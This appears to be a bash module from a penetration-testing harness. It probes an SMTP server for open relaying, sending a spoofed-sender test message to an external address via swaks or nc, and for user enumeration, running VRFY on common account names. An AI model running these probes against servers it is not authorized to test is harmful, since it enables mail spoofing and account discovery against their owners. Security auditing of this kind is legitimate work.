#!/usr/bin/env bash
# attacks/smtp.sh — SMTP abuse module (open relay, user enumeration)
set -euo pipefail

TARGET="${SMTP_TARGET:-${TARGET:-10.10.10.1}}"
PORT="${SMTP_PORT:-25}"

echo "[smtp] Starting SMTP module → $TARGET:$PORT"

# 1. Open relay test via swaks
if command -v swaks >/dev/null 2>&1; then
    echo "[smtp] Open relay test with swaks..."
    swaks --to evil@external.com \
          --from spoofed@internal.local \
          --server "${TARGET}:${PORT}" \
          --timeout 5 >/dev/null 2>&1 || true
else
    echo "[smtp] swaks not found — using raw nc relay test..."
    (echo "EHLO harness.test
MAIL FROM:<spoofed@internal.local>
RCPT TO:<evil@external.com>
DATA
Subject: Open relay test
Test message from harness.
.
QUIT") | timeout 5 nc -w 3 "$TARGET" "$PORT" 2>/dev/null || true
fi

# 2. User enumeration via VRFY / EXPN
echo "[smtp] User enumeration (VRFY/EXPN)..."
for user in root admin postmaster info; do
    (echo "VRFY $user"; sleep 1; echo "QUIT") \
        | timeout 5 nc -w 3 "$TARGET" "$PORT" 2>/dev/null || true
done

echo "[smtp] Module complete."
